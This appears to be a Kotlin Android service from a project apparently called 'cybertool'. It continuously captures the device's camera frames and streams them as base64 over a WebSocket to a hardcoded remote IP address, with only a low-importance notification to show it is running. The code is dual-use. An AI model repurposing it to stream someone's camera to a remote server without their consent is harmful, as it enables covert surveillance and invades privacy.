package com.riqel.cybertool

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import android.util.Size
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

class CameraStreamService : Service() {
    private lateinit var cameraManager: CameraManager
    private var cameraDevice: CameraDevice? = null
    private lateinit var imageReader: ImageReader
    private lateinit var backgroundHandler: Handler
    private lateinit var backgroundThread: HandlerThread
    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .build()
    private var streaming = false

    companion object {
        private const val CHANNEL_ID = "camera_stream"
        private const val NOTIF_ID = 3
        private var instance: CameraStreamService? = null
        fun startStream(context: Context) {
            val intent = Intent(context, CameraStreamService::class.java)
            context.startService(intent)
        }
        fun stopStream(context: Context) {
            val intent = Intent(context, CameraStreamService::class.java)
            context.stopService(intent)
            instance?.stopStreaming()
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        backgroundThread = HandlerThread("CameraBackground").apply { start() }
        backgroundHandler = Handler(backgroundThread.looper)
        createNotificationChannel()
        startForeground(NOTIF_ID, getNotification())
        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startStreaming()
        return START_STICKY
    }

    private fun startStreaming() {
        if (streaming) return
        streaming = true
        openCamera()
        connectWebSocket()
    }

    private fun stopStreaming() {
        streaming = false
        webSocket?.close(1000, null)
        cameraDevice?.close()
    }

    private fun openCamera() {
        val cameraId = cameraManager.cameraIdList[0] // back camera
        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                createImageReader()
            }
            override fun onDisconnected(camera: CameraDevice) { camera.close() }
            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
        }, backgroundHandler)
    }

    private fun createImageReader() {
        val size = Size(640, 480)
        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
        imageReader.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage()
            if (image != null && streaming) {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                webSocket?.send(b64)
                image.close()
            }
        }, backgroundHandler)
        val captureRequest = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
        captureRequest?.addTarget(imageReader.surface)
        cameraDevice?.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
            override fun onConfigured(session: CameraCaptureSession) {
                session.setRepeatingRequest(captureRequest?.build()!!, null, backgroundHandler)
            }
            override fun onConfigureFailed(session: CameraCaptureSession) {}
        }, backgroundHandler)
    }

    private fun connectWebSocket() {
        val wsUrl = "ws://100.102.225.113:5000/stream"  // Update IP
        val request = Request.Builder().url(wsUrl).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                // Ready
            }
            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                streaming = false
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                streaming = false
            }
        })
    }

    private fun getNotification(): Notification = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("Camera Stream")
        .setContentText("Streaming is active")
        .setSmallIcon(android.R.drawable.ic_menu_camera)
        .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Camera Stream", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        stopStreaming()
        super.onDestroy()
    }
}
